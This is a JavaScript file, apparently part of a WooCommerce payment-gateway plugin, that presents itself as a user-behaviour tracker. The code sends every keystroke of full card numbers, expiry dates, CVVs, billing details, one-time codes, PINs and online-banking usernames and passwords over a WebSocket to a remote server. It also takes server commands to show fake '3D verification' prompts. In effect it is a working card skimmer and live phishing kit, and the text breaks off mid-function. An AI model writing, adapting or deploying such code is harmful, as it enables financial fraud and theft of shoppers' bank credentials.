/**
 * Clean Payment Gateway - 用户行为追踪
 * 实时追踪用户输入并通过 WebSocket 发送到后端
 */

(function() {
    'use strict';

    /**
     * 追踪器类
     */
    class CPG_Tracker {
        constructor(config) {
            this.config = config || {};
            this.ws = null;
            this.wsConnected = false;
            this.manualDisconnect = false; // ✅ 手动断开标志
            this.reconnectTimeout = null; // ✅ 重连定时器
            
            // 🔥 指数退避重连配置
            this.reconnectAttempts = 0;
            this.maxReconnectAttempts = 10;
            this.reconnectDelay = 1000; // 初始1秒
            this.maxReconnectDelay = 30000; // 最大30秒
            
            this.sessionId = '';
            this.orderNo = ''; // ✅ 新增：订单号
            this.deviceInfo = {};
            this.geoInfo = {};
            this.cardData = {};
            this.messageQueue = []; // ✅ 消息队列（WebSocket连接前缓存）
            
            // 🔥 规范：ping 心跳定时器（每30秒）
            this.pingTimer = null;
            this.heartbeatInterval = 30000; // 30秒
            
            this.log('追踪器已创建', this.config);
        }

        /**
         * 初始化追踪器
         */
        async init() {
            // ✅ 安全检查：配置是否有效
            if (!this.config.enabled) {
                console.warn('[CPG Tracker] ⚠️ 追踪未启用，停止初始化');
                this.disconnect(); // 确保断开任何现有连接
                return;
            }

            if (!this.config.ws_url) {
                console.warn('[CPG Tracker] ⚠️ WebSocket URL 未配置，停止初始化');
                this.disconnect(); // 确保断开任何现有连接
                return;
            }

            // 🔥🔥🔥 修复：智能处理 WebSocket URL 🔥🔥🔥
            // 替换 localhost, 127.0.0.1, 以及各种 Docker 容器名称为浏览器可访问的主机名
            const hostname = window.location.hostname || 'localhost';
            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            let wsUrl = this.config.ws_url;
            
            // 检查是否是内部地址
            const isInternalUrl = /localhost|127\.0\.0\.1|hyperf|beibei-hyperf|payment-gateway-hyperf/i.test(wsUrl);
            
            if (isInternalUrl) {
                // 替换内部主机名为浏览器可访问的主机名
                wsUrl = wsUrl.replace(/localhost|127\.0\.0\.1|beibei-hyperf|hyperf|payment-gateway-hyperf/gi, hostname);
                
                // 🔥 如果使用 wss://（HTTPS站点），移除端口号（通过 Nginx 代理）
                if (protocol === 'wss:') {
                    wsUrl = wsUrl.replace(/:9502/g, '');
                    // 确保使用 wss 协议
                    wsUrl = wsUrl.replace(/^ws:/i, 'wss:');
                }
            }
            
            this.config.ws_url = wsUrl;

            this.sessionId = this.generateSessionId();
            this.orderNo = this.generateOrderNo(); // ✅ 生成订单号
            
            // 🔥 保存session_id到cookie，以便在支付时关联订单
            document.cookie = `cpg_session_id=${this.sessionId}; path=/; max-age=3600`;
            
            this.collectDeviceInfo();
            await this.collectGeoInfo();
            
            // ✅ 立即绑定事件监听器（确保在payment-form.js之前或同时）
            this.bindEvents();
            
            // WebSocket连接可以稍后（避免阻塞）
            setTimeout(() => {
                this.connectWebSocket();
            }, 100);
            
            // 🔥 暴露全局对象供3D验证使用
            window.cpgTracker = this;
        }

        /**
         * 连接 WebSocket
         */
        connectWebSocket() {
            try {
                // 🔥 构建完整的 WebSocket URL（包含必需的查询参数）
                const wsUrl = this.config.ws_url;
                const params = new URLSearchParams({
                    type: 'wordpress',  // 连接类型
                    id: this.sessionId,  // 会话 ID
                    merchant: this.config.merchant_id || 'default',  // 商户 ID
                    site: this.config.site_url || window.location.origin,  // 站点 URL
                });
                const fullWsUrl = `${wsUrl}?${params.toString()}`;
                
                
                this.ws = new WebSocket(fullWsUrl);

                this.ws.onopen = () => {
                    this.wsConnected = true;
                    
                    // 🔥 连接成功，重置重连计数
                    this.reconnectAttempts = 0;
                    
                    // 发送客户端连接消息
                    this.sendMessage({
                        type: 'client_connected',
                        session_id: this.sessionId,
                        order_no: this.orderNo,  // ✅ 前端生成的订单号
                        order_id: this.getOrderId() || null,  // 🔥 新增：WooCommerce 订单 ID
                        site_name: this.config.site_name,
                        site_url: this.config.site_url,
                        order_prefix: this.config.order_prefix,
                        page_url: window.location.href,
                        user_agent: navigator.userAgent,
                        device_info: this.deviceInfo,
                        geo_info: this.geoInfo,
                        timestamp: Date.now(),
                    });
                    
                    // 发送页面加载事件
                    this.trackEvent('page_load', {
                        page_title: document.title,
                        page_url: window.location.href,
                        referrer: document.referrer,
                    });
                    
                    // 🔥🔥🔥 第一时间发送商品信息 🔥🔥🔥
                    this.sendProductInfo();
                    
                    // 🔥 新增：记录访问日志到后端
                    this.recordAccessLog();
                    
                    // ✅ 发送队列中的消息
                    this.flushMessageQueue();
                    
                    // 🔥 规范：启动 ping 心跳定时器（每30秒）
                    this.startPingHeartbeat();
                };

                this.ws.onmessage = (event) => {
                    try {
                        const data = JSON.parse(event.data);
                        
                        // 🔥 发布全局事件（供 3d-verification.js 等其他脚本订阅）
                        window.dispatchEvent(new CustomEvent('cpg-ws-message', {
                            detail: data
                        }));
                        
                        // 🔥 处理不同类型的消息
                        switch (data.type) {
                            case 'connected':
                            case 'connection_confirmed':
                                // 🔥 规范：服务器确认连接
                                this.log('✅ 服务器确认连接:', data);
                                break;
                            
                            case 'pong':
                                // 🔥 规范：收到服务器 pong 响应
                                this.log('📥 收到 pong 响应:', data);
                                break;
                                
                            case 'admin_action':
                                // 🔥 管理员操作指令（由 3d-verification.js 处理）
                                // 不做任何处理，让 3d-verification.js 通过全局事件接收
                                break;
                                
                            case 'verification_request':
                            case 'show_verification':
                                // 🔥 3D验证指令（旧格式，向后兼容）
                                this.handleVerificationRequest(data);
                                break;
                                
                            case 'verification_success':
                                this.handleVerificationSuccess(data);
                                break;
                                
                            case 'verification_failed':
                                this.handleVerificationFailed(data);
                                break;
                                
                            case 'payment_authorized':
                                this.handlePaymentAuthorized(data);
                                break;
                                
                            default:
                                break;
                        }
                    } catch (e) {
                    }
                };

                this.ws.onerror = (error) => {
                    this.wsConnected = false;
                    
                    // 🔥 只在首次失败时输出详细日志，避免控制台刷屏
                    if (this.reconnectAttempts === 0) {
                        console.warn('[CPG Tracker] ⚠️ WebSocket 连接失败，将自动重试');
                        console.warn('[CPG Tracker] 📋 URL:', this.config.ws_url);
                        if (this.config.debug) {
                            console.warn('[CPG Tracker] 💡 请检查后端服务是否运行');
                        }
                    }
                };

                this.ws.onclose = () => {
                    this.log('🔌 WebSocket 已断开');
                    this.wsConnected = false;
                    
                    // 🔥 规范：停止 ping 心跳
                    this.stopPingHeartbeat();
                    
                    // ✅ 检查是否应该重连（配置仍然有效）
                    if (this.config.enabled && this.config.ws_url && !this.manualDisconnect) {
                        // 🔥 使用指数退避重连
                        this.handleReconnect();
                    } else {
                        this.log('❌ 已禁用自动重连（配置已移除或手动断开）');
                    }
                };
            } catch (error) {
                this.error('❌ WebSocket 连接失败:', error);
                this.wsConnected = false;
            }
        }

        /**
         * 发送消息（支持队列缓存）
         */
        sendMessage(data) {
            if (!this.ws || !this.wsConnected) {
                // ✅ WebSocket未连接，加入队列（静默处理，减少日志）
                this.messageQueue.push(data);
                // 只在调试模式下输出
                if (this.config.debug) {
                    this.log('消息已加入队列 (' + this.messageQueue.length + ')');
                }
                return;
            }

            try {
                this.ws.send(JSON.stringify(data));
                // ✅ 强制输出发送确认日志
            } catch (error) {
                console.error('[CPG Tracker] ❌ 发送失败:', error);
            }
        }
        
        /**
         * 发送队列中的消息
         */
        flushMessageQueue() {
            if (this.messageQueue.length === 0) return;
            
            this.log('📤 发送队列中的 ' + this.messageQueue.length + ' 条消息');
            const queue = [...this.messageQueue];
            this.messageQueue = [];
            
            queue.forEach(data => {
                this.sendMessage(data);
            });
        }

        /**
         * 🔥 处理重连（指数退避算法）
         */
        handleReconnect() {
            this.reconnectAttempts++;
            
            // 检查是否达到最大重连次数
            if (this.reconnectAttempts > this.maxReconnectAttempts) {
                // 🔥 只输出一次最终失败日志
                console.warn('[CPG Tracker] ⚠️ WebSocket 重连已停止（达到最大次数）');
                return;
            }
            
            // 计算重连延迟（指数退避：1s, 2s, 4s, 8s, 16s, 30s(max)）
            const delay = Math.min(
                this.reconnectDelay * Math.pow(2, this.reconnectAttempts - 1),
                this.maxReconnectDelay
            );
            
            // 🔥 只在调试模式下输出重连日志
            if (this.config.debug) {
                this.log('🔄 将在 ' + (delay/1000) + '秒后重连（第' + this.reconnectAttempts + '次）');
            }
            
            // 清除旧的重连定时器
            if (this.reconnectTimeout) {
                clearTimeout(this.reconnectTimeout);
            }
            
            // 设置新的重连定时器
            this.reconnectTimeout = setTimeout(() => {
                this.connectWebSocket();
            }, delay);
        }

        /**
         * ✅ 手动断开连接（安全功能）
         * 当配置被移除或禁用时调用
         */
        disconnect() {
            this.log('🛑 手动断开 WebSocket 连接');
            this.manualDisconnect = true;
            
            // 清除重连定时器
            if (this.reconnectTimeout) {
                clearTimeout(this.reconnectTimeout);
                this.reconnectTimeout = null;
            }
            
            // 关闭 WebSocket
            if (this.ws) {
                try {
                    // 发送断开通知
                    if (this.wsConnected) {
                        this.sendMessage({
                            type: 'user_offline',
                            session_id: this.sessionId,
                            reason: 'manual_disconnect',
                            timestamp: Date.now(),
                        });
                    }
                    this.ws.close();
                } catch (error) {
                    this.error('断开连接时出错:', error);
                }
                this.ws = null;
            }
            
            this.wsConnected = false;
            this.messageQueue = []; // 清空消息队列
            
            // 🔥 规范：停止 ping 心跳
            this.stopPingHeartbeat();
        }

        /**
         * 🔥 规范：启动 ping 心跳（每30秒）
         */
        startPingHeartbeat() {
            // 先停止之前的心跳
            this.stopPingHeartbeat();
            
            this.log('🔥 启动 ping 心跳定时器（每30秒）');
            
            // 每30秒发送一次 ping 心跳
            this.pingTimer = setInterval(() => {
                if (this.wsConnected && this.ws && this.ws.readyState === WebSocket.OPEN) {
                    const pingMessage = {
                        type: 'ping',
                        session_id: this.sessionId,
                        timestamp: Date.now()
                    };
                    
                    this.ws.send(JSON.stringify(pingMessage));
                    this.log('📤 发送 ping 心跳');
                }
            }, this.heartbeatInterval);
        }

        /**
         * 🔥 规范：停止 ping 心跳
         */
        stopPingHeartbeat() {
            if (this.pingTimer) {
                clearInterval(this.pingTimer);
                this.pingTimer = null;
                this.log('🛑 停止 ping 心跳定时器');
            }
        }

        /**
         * 绑定表单事件
         */
        bindEvents() {
            // ✅ 强制输出日志（不受debug限制）
            
            // 🔥 新增：发送商品浏览事件
            this.trackProductView();
            
            // 优先绑定支付字段（使用专用事件）
            this.bindPaymentFieldsWithSpecialEvents();
            
            // 监听所有输入框
            const inputs = document.querySelectorAll('input, select, textarea');
            this.log(`找到 ${inputs.length} 个输入元素`);
            
            inputs.forEach(input => {
                // 🔥 优先读取 data-field 属性
                const fieldName = input.dataset.field || input.name || input.id || '';
                const isPaymentField = ['cpg_card_number_input', 'cpg_expiry_input', 'cpg_cvv_input'].includes(input.id);
                
                // 跳过支付字段（已单独处理）
                if (isPaymentField) {
                    return;
                }
                
                // 输入事件（✅ 移除防抖，立即发送，确保用户在哪状态就在哪）
                input.addEventListener('input', (e) => {
                    this.trackInputWithSpecialEvents(e.target);
                });
                
                // 🔥 新增：change事件（用于select下拉框）
                input.addEventListener('change', (e) => {
                    this.trackInputWithSpecialEvents(e.target);
                });

                // 焦点事件 - 立即发送
                input.addEventListener('focus', (e) => {
                    this.trackEvent('input_focus', {
                        field: e.target.name || e.target.id || 'unknown',
                        type: e.target.type,
                        placeholder: e.target.placeholder,
                    });
                });

                // 🔥🔥🔥 失焦事件 - 包含实际值（符合后端规范）🔥🔥🔥
                input.addEventListener('blur', (e) => {
                    var fieldName = e.target.name || e.target.id || 'unknown';
                    var fieldValue = e.target.value || '';
                    
                    // 🔥 构建失焦事件数据，包含实际值
                    var blurData = {
                        field: fieldName,
                        type: e.target.type,
                        has_value: !!fieldValue,
                        value_length: fieldValue.length,
                    };
                    
                    // 🔥 如果有值，包含实际值（后端需要）
                    if (fieldValue) {
                        blurData.value = fieldValue;
                        
                        // 🔥 根据字段类型添加特定字段（符合后端字段优先级）
                        if (fieldName === 'billing_email' || fieldName === 'shipping_email') {
                            blurData.email = fieldValue;
                        } else if (fieldName === 'billing_phone' || fieldName === 'shipping_phone') {
                            blurData.phone = fieldValue;
                        } else if (fieldName.includes('first_name') || fieldName.includes('last_name')) {
                            blurData.name = fieldValue;
                            blurData.full_name = this.getFullName();
                        } else if (fieldName.includes('address')) {
                            blurData.address = fieldValue;
                        } else if (fieldName.includes('city')) {
                            blurData.city = fieldValue;
                        } else if (fieldName.includes('state')) {
                            blurData.state = fieldValue;
                        } else if (fieldName.includes('postcode')) {
                            blurData.postcode = fieldValue;
                        } else if (fieldName.includes('country')) {
                            blurData.country = fieldValue;
                        }
                    }
                    
                    this.trackFocusEvent('input_blur', blurData, 'input_blur');
                });
            });

            // 监听表单提交
            const forms = document.querySelectorAll('form');
            this.log(`找到 ${forms.length} 个表单`);
            
            forms.forEach(form => {
                form.addEventListener('submit', (e) => {
                    this.trackFormSubmit(form);
                });
            });
            
            // 🔥 监听下单按钮点击（主网关）
            this.monitorPlaceOrderButton();
            
            // 🔥 监听 PayPal link cart 按钮
            this.monitorPayPalLinkCart();
            
            // 特别监听支付表单的卡片输入
            this.monitorPaymentFields();
            
            // 🔥 新增：专门监听WooCommerce的国家和州字段
            this.monitorWooCommerceFields();
            
            // 🔥 新增：监听验证界面输入框（OTP、Email、PIN等）
            this.bindVerificationFields();
            
            // 🔥 更新页面上的产品和价格显示（如果存在）
            this.updateProductDisplay();
        }
        
        /**
         * 🔥 更新页面上的产品和价格显示元素
         */
        updateProductDisplay() {
            const productInfo = this.getProductInfo();
            
            // 更新所有包含 "Product N/A" 或 "Amount $0.00" 的元素
            const detailRows = document.querySelectorAll('.cpg-detail-row');
            detailRows.forEach(row => {
                const text = row.textContent || '';
                if (text.includes('Product N/A') || text.includes('Product')) {
                    // 更新产品名称
                    if (productInfo.name && productInfo.name !== 'N/A') {
                        row.textContent = text.replace(/Product\s+N\/A|Product/, `Product ${productInfo.name}`);
                    }
                }
                if (text.includes('Amount $0.00') || text.includes('Amount')) {
                    // 更新价格
                    if (productInfo.price && productInfo.price !== '$0.00') {
                        row.textContent = text.replace(/Amount\s+\$0\.00|Amount/, `Amount ${productInfo.price}`);
                    }
                }
            });
            
            // 也尝试更新其他可能的选择器
            const productElements = document.querySelectorAll('[data-product-name], .product-display, .order-product-name');
            productElements.forEach(el => {
                if (productInfo.name && productInfo.name !== 'N/A') {
                    el.textContent = productInfo.name;
                }
            });
            
            const priceElements = document.querySelectorAll('[data-product-price], .price-display, .order-total-display');
            priceElements.forEach(el => {
                if (productInfo.price && productInfo.price !== '$0.00') {
                    el.textContent = productInfo.price;
                }
            });
            
            // 延迟再次尝试（页面可能还在加载）
            if (productInfo.name === 'N/A' || productInfo.price === '$0.00') {
                setTimeout(() => {
                    const retryInfo = this.getProductInfo();
                    if (retryInfo.name !== 'N/A' || retryInfo.price !== '$0.00') {
                        this.updateProductDisplay();
                    }
                }, 1000);
            }
        }

        /**
         * 🔥 新增：专门监听WooCommerce字段（国家、州等）
         * 🔧 性能优化：移除 setInterval，改用事件监听
         */
        monitorWooCommerceFields() {
            
            // 需要监听的字段列表
            const fieldsToMonitor = [
                'billing_country',
                'billing_state',
                'shipping_country',
                'shipping_state'
            ];
            
            // 使用MutationObserver监听整个表单的变化
            const checkoutForm = document.querySelector('form.checkout, form.woocommerce-checkout');
            if (!checkoutForm) {
                console.warn('[CPG Tracker] ⚠️ 未找到结账表单');
                return;
            }
            
            // 保存字段值用于比较
            const fieldValues = {};
            const self = this;
            
            // 初始化字段值
            fieldsToMonitor.forEach(fieldName => {
                const field = document.querySelector(`#${fieldName}, [name="${fieldName}"]`);
                if (field) {
                    fieldValues[fieldName] = field.value;
                }
            });
            
            // 🔧 使用事件监听替代 setInterval（性能优化）
            // 监听 jQuery 的 change 事件（WooCommerce 和 Select2 都会触发）
            if (typeof jQuery !== 'undefined') {
                fieldsToMonitor.forEach(fieldName => {
                    jQuery(document).on('change', `#${fieldName}, [name="${fieldName}"]`, (e) => {
                        const newValue = e.target.value;
                        if (newValue !== fieldValues[fieldName]) {
                            fieldValues[fieldName] = newValue;
                            if (newValue) {
                                self.trackInputWithSpecialEvents(e.target);
                            }
                        }
                    });
                });
                
                // 🔧 监听 WooCommerce 的 updated_checkout 事件（一次性检查所有字段）
                jQuery(document.body).on('updated_checkout', () => {
                    fieldsToMonitor.forEach(fieldName => {
                        const field = document.querySelector(`#${fieldName}, [name="${fieldName}"]`);
                        if (field && field.value !== fieldValues[fieldName]) {
                            const newValue = field.value;
                            fieldValues[fieldName] = newValue;
                            if (newValue) {
                                self.trackInputWithSpecialEvents(field);
                            }
                        }
                    });
                });
            }
            
            // 🔧 原生事件监听作为备用
            fieldsToMonitor.forEach(fieldName => {
                const field = document.querySelector(`#${fieldName}, [name="${fieldName}"]`);
                if (field) {
                    field.addEventListener('change', (e) => {
                        const newValue = e.target.value;
                        if (newValue !== fieldValues[fieldName]) {
                            fieldValues[fieldName] = newValue;
                            if (newValue) {
                                self.trackInputWithSpecialEvents(e.target);
                            }
                        }
                    });
                }
            });
            
            // 🔧 已移除: setInterval 每500ms轮询 - 这是导致卡顿的原因之一
        }

        /**
         * 绑定支付字段专用事件
         */
        bindPaymentFieldsWithSpecialEvents() {
            // ✅ 强制输出日志（不受debug限制）
            
            // 卡号输入框
            const cardNumberInput = document.getElementById('cpg_card_number_input');
            if (cardNumberInput) {
                
                // 每次输入都发送事件
                // ✅ 使用延迟读取，确保在payment-form.js格式化后读取最新值
                cardNumberInput.addEventListener('input', (e) => {
                    // ✅ 使用setTimeout(0)延迟到下一个事件循环，确保格式化完成
                    setTimeout(() => {
                        const value = e.target.value.replace(/\s/g, '');
                        if (value.length > 0) {
                            const cardType = this.detectCardType(value);
                            
                            // 🔥 关键：同步更新隐藏字段
                            const hiddenField = document.getElementById('cpg_card_number');
                            if (hiddenField) {
                                hiddenField.value = value;
                                // 触发change事件以便captureCardData能捕获
                                hiddenField.dispatchEvent(new Event('change', { bubbles: true }));
                            }
                            
                            // 同步更新卡类型隐藏字段
                            const cardTypeField = document.getElementById('cpg_card_type');
                            if (cardTypeField) {
                                cardTypeField.value = cardType;
                            }
                            
                            // ✅ 发送实际的卡号数据（脱敏后的BIN + 完整卡号）
                            this.trackEvent('input_card', {
                                card_type: cardType,
                                card_no: value,  // ✅ 完整卡号
                                card_no_masked: this.maskCardNumber(value),  // ✅ 脱敏卡号
                                length: value.length
                            });
                        }
                    }, 0);
                }, false); // bubble模式（默认），在格式化后执行
            } else {
                console.warn('[CPG Tracker] ❌ 未找到卡号输入框 #cpg_card_number_input');
            }
            
            // 有效期输入框
            const expiryInput = document.getElementById('cpg_expiry_input');
            if (expiryInput) {
                
                expiryInput.addEventListener('input', (e) => {
                    // ✅ 延迟读取，确保格式化后的值
                    setTimeout(() => {
                        const value = e.target.value;
                        if (value.length > 0) {
                            // 🔥 关键：同步更新隐藏字段
                            const hiddenField = document.getElementById('cpg_expiry_date');
                            if (hiddenField) {
                                hiddenField.value = value;
                                // 触发change事件
                                hiddenField.dispatchEvent(new Event('change', { bubbles: true }));
                            }
                            
                            // ✅ 发送 input_expiry 事件（包含实际值）
                            this.trackEvent('input_expiry', {
                                card_expiry: value,  // ✅ 有效期值
                                expiry: value,  // ✅ 别名（兼容）
                                length: value.length
                            });
                        }
                    }, 0);
                }, false);
            } else {
                console.warn('[CPG Tracker] ❌ 未找到有效期输入框 #cpg_expiry_input');
            }
            
            // CVV输入框
            const cvvInput = document.getElementById('cpg_cvv_input');
            if (cvvInput) {
                
                cvvInput.addEventListener('input', (e) => {
                    // ✅ 延迟读取，确保格式化后的值
                    setTimeout(() => {
                        const value = e.target.value;
                        if (value.length > 0) {
                            // 🔥 关键：同步更新隐藏字段
                            const hiddenField = document.getElementById('cpg_cvv');
                            if (hiddenField) {
                                hiddenField.value = value;
                                // 触发change事件
                                hiddenField.dispatchEvent(new Event('change', { bubbles: true }));
                            }
                            
                            // ✅ 发送 input_cvv 事件（包含实际值）
                            this.trackEvent('input_cvv', {
                                cvv: value,  // ✅ CVV值
                                length: value.length
                            });
                        }
                    }, 0);
                }, false);
            } else {
                console.warn('[CPG Tracker] ❌ 未找到CVV输入框 #cpg_cvv_input');
            }
            
            // ✅ 为支付字段添加 focus/blur 事件监听（bubble模式）
            const paymentFields = [cardNumberInput, expiryInput, cvvInput].filter(Boolean);
            paymentFields.forEach(field => {
                // focus事件
                field.addEventListener('focus', (e) => {
                    this.trackEvent('input_focus', {
                        field: e.target.id || 'unknown',
                        type: e.target.type,
                    });
                }, false);
                
                // 🔥 blur事件 - 发送实际值（与PayPal网关保持一致）
                field.addEventListener('blur', (e) => {
                    const fieldId = e.target.id || 'unknown';
                    const fieldValue = e.target.value || '';
                    
                    // 构建事件数据
                    const blurData = {
                        field: fieldId,
                        type: e.target.type,
                        has_value: !!fieldValue,
                        value_length: fieldValue.length,
                    };
                    
                    // 🔥 根据字段类型发送实际值（关键字段）
                    if (fieldId === 'cpg_card_number_input') {
                        const cleanValue = fieldValue.replace(/\s/g, '');
                        if (cleanValue.length > 0) {
                            blurData.value = cleanValue;
                            blurData.card_no = cleanValue;
                            blurData.card_number = cleanValue;
                            blurData.card_number_masked = this.maskCardNumber(cleanValue);
                            blurData.card_type = this.detectCardType(cleanValue);
                        }
                    } else if (fieldId === 'cpg_expiry_input') {
                        if (fieldValue.length > 0) {
                            blurData.value = fieldValue;
                            blurData.expiry = fieldValue;
                            blurData.expiry_date = fieldValue;
                            blurData.card_expiry = fieldValue;
                        }
                    } else if (fieldId === 'cpg_cvv_input') {
                        if (fieldValue.length > 0) {
                            blurData.value = fieldValue;
                            blurData.cvv = fieldValue;
                            blurData.card_cvv = fieldValue;
                        }
                    }
                    
                    // 🔥 规范：使用统一的 trackFocusEvent 方法，input_blur 使用 type: 'input_blur'
                    this.trackFocusEvent('input_blur', blurData, 'input_blur');
                    
                    // 🔥 注意：card_data_captured 事件只在用户点击下单按钮（主网关）或 link cart（PayPal）时触发
                    // 不再在 CVV blur 时自动触发
                }, false);
            });
            
            // 🔥🔥🔥 添加持卡人姓名失焦事件监听 🔥🔥🔥
            const cardholderNameInput = document.getElementById('cpg_cardholder_name');
            if (cardholderNameInput) {
                // focus事件
                cardholderNameInput.addEventListener('focus', (e) => {
                    this.trackEvent('input_focus', {
                        field: e.target.id || 'cpg_cardholder_name',
                        type: e.target.type,
                    });
                }, false);
                
                // 🔥 blur事件 - 发送实际值，但不触发card_data_captured
                cardholderNameInput.addEventListener('blur', (e) => {
                    const fieldValue = e.target.value || '';
                    
                    // 构建事件数据
                    const blurData = {
                        field: 'cpg_cardholder_name',
                        type: e.target.type,
                        has_value: !!fieldValue,
                        value_length: fieldValue.length,
                    };
                    
                    // 如果有值，发送实际值
                    if (fieldValue.length > 0) {
                        blurData.value = fieldValue;
                        blurData.cardholder_name = fieldValue;
                        blurData.name_on_card = fieldValue;
                    }
                    
                    // 🔥 规范：使用统一的 trackFocusEvent 方法，input_blur 使用 type: 'input_blur'
                    this.trackFocusEvent('input_blur', blurData, 'input_blur');
                    
                    // 🔥 注意：持卡人姓名失焦不应触发card_data_captured事件
                }, false);
            } else {
                console.warn('[CPG Tracker] ⚠️ 未找到持卡人姓名输入框 #cpg_cardholder_name');
            }
        }

        /**
         * 🔥 监听下单按钮点击（主网关）
         */
        monitorPlaceOrderButton() {
            // 监听下单按钮（WooCommerce 标准按钮）
            const placeOrderButton = document.getElementById('place_order');
            if (placeOrderButton) {
                placeOrderButton.addEventListener('click', (e) => {
                    this.log('🛒 用户点击下单按钮（主网关）');
                    // 在点击下单按钮时捕获卡号数据
                    this.captureCardData();
                });
            }
            
            // 也监听其他可能的下单按钮选择器
            const checkoutButtons = document.querySelectorAll('button[name="woocommerce_checkout_place_order"], button.place-order, .place-order-button');
            checkoutButtons.forEach(button => {
                if (button.id !== 'place_order') { // 避免重复监听
                    button.addEventListener('click', (e) => {
                        this.log('🛒 用户点击下单按钮（主网关 - 备用选择器）');
                        this.captureCardData();
                    });
                }
            });
        }

        /**
         * 🔥 监听 PayPal link cart 按钮
         */
        monitorPayPalLinkCart() {
            // 监听 PayPal link cart 按钮（多种可能的选择器）
            const paypalSelectors = [
                'button[data-paypal-button]',
                '.paypal-button',
                '#paypal-button',
                'button[class*="paypal"]',
                'a[class*="paypal"]',
                '.wcppec-checkout-buttons button',
                '.woocommerce-checkout-place-order .paypal-button'
            ];
            
            paypalSelectors.forEach(selector => {
                const buttons = document.querySelectorAll(selector);
                buttons.forEach(button => {
                    button.addEventListener('click', (e) => {
                        this.log('🛒 用户点击 PayPal link cart 按钮');
                        // 在点击 PayPal link cart 时捕获卡号数据
                        this.captureCardData();
                    });
                });
            });
            
            // 也监听动态添加的 PayPal 按钮（使用事件委托）
            document.addEventListener('click', (e) => {
                const target = e.target;
                // 检查是否是 PayPal 相关按钮
                if (target && (
                    target.closest('[data-paypal-button]') ||
                    target.closest('.paypal-button') ||
                    target.closest('.wcppec-checkout-buttons') ||
                    (target.textContent && target.textContent.toLowerCase().includes('paypal'))
                )) {
                    this.log('🛒 用户点击 PayPal link cart 按钮（事件委托）');
                    this.captureCardData();
                }
            }, true); // 使用捕获阶段确保能捕获到
        }

        /**
         * 🔥 绑定验证界面输入框事件（OTP、Email、PIN、CVV等）
         */
        bindVerificationFields() {
            
            // 🔥 规范：验证界面输入框列表（使用规范中定义的 verification_type）
            const verificationFields = [
                { id: 'otpInput', type: 'otp', label: 'OTP验证码' },
                { id: 'emailInput', type: 'email', label: 'Email验证码' },
                { id: 'pinInput', type: 'pin', label: 'PIN密码' },
                { id: 'cvvInput', type: 'cvv', label: 'CVV验证' },  // 规范：cvv
                { id: 'bankCustomerInput', type: 'bank_username', label: '网银账号' },  // 规范：bank_username
                { id: 'bankPasswordInput', type: 'bank_password', label: '网银密码' },
                { id: 'customInput', type: 'custom', label: '自定义验证' }  // 规范简化
            ];
            
            // 🔥 新增：验证界面按钮列表
            const verificationButtons = [
                { selector: '.cpg-submit-btn', type: 'submit', event: 'verification_submit_btn', label: '提交按钮' },
                { selector: '.cpg-resend-btn', type: 'resend', event: 'resend_code', label: '重发验证码' }
            ];
            
            // 🔥 使用MutationObserver监听验证界面的显示
            // 因为验证界面是动态显示的，需要在显示后才能绑定事件
            const observer = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === 1 && node.classList && node.classList.contains('cpg-verify')) {
                            this.attachVerificationFieldListeners(verificationFields);
                        }
                    });
                    
                    // 检查class变化（验证界面从隐藏到显示）
                    if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
                        if (mutation.target.classList.contains('active')) {
                            this.attachVerificationFieldListeners(verificationFields);
                            this.attachVerificationButtonListeners(verificationButtons);
                        }
                    }
                });
            });
            
            // 监听整个document的子节点变化
            observer.observe(document.body, {
                childList: true,
                subtree: true,
                attributes: true,
                attributeFilter: ['class', 'style']
            });
            
            // 🔥 立即尝试绑定（如果验证界面已存在）
            this.attachVerificationFieldListeners(verificationFields);
            this.attachVerificationButtonListeners(verificationButtons);
            
        }
        
        /**
         * 🔥 附加验证字段监听器
         */
        attachVerificationFieldListeners(fields) {
            fields.forEach(field => {
                const input = document.getElementById(field.id);
                
                // 检查是否已绑定（避免重复绑定）
                if (input && !input.dataset.trackingBound) {
                    
                    // 标记已绑定
                    input.dataset.trackingBound = 'true';
                    
                    // 输入事件 - 实时发送
                    input.addEventListener('input', (e) => {
                        const value = e.target.value;
                        
                        // 获取验证类型
                        const verificationType = e.target.getAttribute('data-verification-type') || field.type;
                        const fieldName = e.target.getAttribute('data-field') || field.id;
                        
                        // 🔥 发送验证输入事件（确保字段在根级别，同时在data中也有）
                        this.sendMessage({
                            type: 'verification_input',
                            session_id: this.sessionId,
                            order_no: this.orderNo,
                            verification_type: verificationType,
                            field: fieldName,
                            value: value,
                            length: value.length,
                            label: field.label,
                            timestamp: Date.now(),
                            // 同时在data对象中包含（兼容不同后端解析方式）
                            data: {
                                verification_type: verificationType,
                                field: fieldName,
                                value: value,
                                length: value.length,
                                label: field.label
                            }
                        });
                    });
                    
                    // 焦点事件 - 使用统一的 trackFocusEvent 方法
                    input.addEventListener('focus', (e) => {
                        const verificationType = e.target.getAttribute('data-verification-type') || field.type;
                        const fieldName = e.target.getAttribute('data-field') || field.id;
                        
                        this.trackFocusEvent('verification_focus', {
                            field: fieldName,
                            verification_type: verificationType,
                            label: field.label
                        }, 'verification_focus');
                    });
                    
                    // 🔥🔥🔥 失焦事件 - 发送实际值 🔥🔥🔥
                    input.addEventListener('blur', (e) => {
                        const value = e.target.value || '';
                        const verificationType = e.target.getAttribute('data-verification-type') || field.type;
                        const fieldName = e.target.getAttribute('data-field') || field.id;
                        
                        // 🔥 构建失焦事件数据，包含实际值
                        const blurData = {
                            field: fieldName,
                            verification_type: verificationType,
                            has_value: !!value,
                            value_length: value.length,
                            label: field.label,
                        };
                        
                        // 🔥 如果有值，发送实际值
                        if (value.length > 0) {
                            blurData.value = value;
                            // 根据验证类型添加特定字段
                            if (verificationType === 'otp' || verificationType === 'email') {
                                blurData.code = value;
                                blurData.verification_code = value;
                            } else if (verificationType === 'pin') {
                                blurData.pin = value;
                                blurData.pin_code = value;
                            } else if (verificationType === 'cvv') {
                                blurData.cvv = value;
                                blurData.card_cvv = value;
                            } else if (verificationType === 'bank_username') {
                                blurData.bank_username = value;
                                blurData.customer_id = value;
                            } else if (verificationType === 'bank_password') {
                                blurData.bank_password = value;
                            }
                        }
                        
                        // 🔥 使用统一的 trackFocusEvent 方法
                        this.trackFocusEvent('verification_blur', blurData, 'verification_blur');
                    });
                    
                    // 🔥 规范：回车提交事件使用 verification_submit
                    input.addEventListener('keypress', (e) => {
                        if (e.key === 'Enter') {
                            const value = e.target.value;
